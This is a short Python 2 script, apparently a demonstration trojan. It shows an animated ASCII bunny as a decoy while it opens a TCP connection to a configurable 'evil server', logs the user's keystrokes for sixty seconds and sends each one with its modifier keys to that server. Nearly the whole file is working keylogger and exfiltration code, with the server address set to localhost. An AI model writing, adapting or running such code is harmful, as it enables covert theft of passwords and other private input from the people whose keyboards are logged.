
import keylogger
import time
import socket
from thread import *

############################################################################

evilBunnyServerIP   = "127.0.0.1"
evilBunnyServerPort = 8000
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

############################################################################

def main() :
   
    # Start a thread that displays an animated ascii bunny
    start_new_thread(animatedBunny, ())
    
    # Establish TCP socket with the distant server
    try :
        sock.connect(( evilBunnyServerIP, evilBunnyServerPort ))
    
    except :
    
        print "Something wrong happened. Failed to connect to evil server ?"

        exit()

    start_new_thread(serverHandler, ())

    # Send a hello message
    sock.send("Hello evil server !")

    # Infinite loop so that the program and thread keeps running
    while True :
        pass



############################################################################

# Thread launched after connection with the evil server is started
# -> it launces the keylogger 
#    + another function which prints what the server sends
def serverHandler():
 
    # Start key logger
    now = time.time()
    done = lambda: time.time() > now + 60
    keylogger.log(done, sendKeysToEvilServer)

    # Print what we receive from the server
    printMessagesFromEvilServer()

############################################################################
   
# Function which is called every time the user presses a key on its computer
def sendKeysToEvilServer(t, modifiers, keys) :
    
    activeMods = ""
    for mod in modifiers :
        if (modifiers[mod] == True) :
            activeMods += "+"+mod+" "

    if (activeMods != "") :
        activeMods = "("+activeMods+")"

    sock.send(str(t)+" "+str(keys)+" "+str(activeMods))

# Function that prints what the server sends
def printMessagesFromEvilServer() :
    
    while True:
         
        data = sock.recv(1024)
        print "[Server] "+data

############################################################################

def animatedBunny() :

    while True:

        for i in range(80) :
            print " "
            
        print """
           \`\ /`/
            \ V /               
            /. .\       
           =\ ~ /=                  
            / ^ \     
         {}/\\\\ //\\
         __\ " " /__           
        (____/^\____)
        """
       
        time.sleep(1)

        for i in range(80) :
            print " "
     
        print """
           \`\ /`/
            \ V /               
            /. .\       
           =\ v /=                  
            / ^ \     
         {}/\\\\ //\\
           \ " " /
           / / \\ \\
          / /   \\ \\
          `-     `-`
        """

        time.sleep(1)

############################################################################
main()


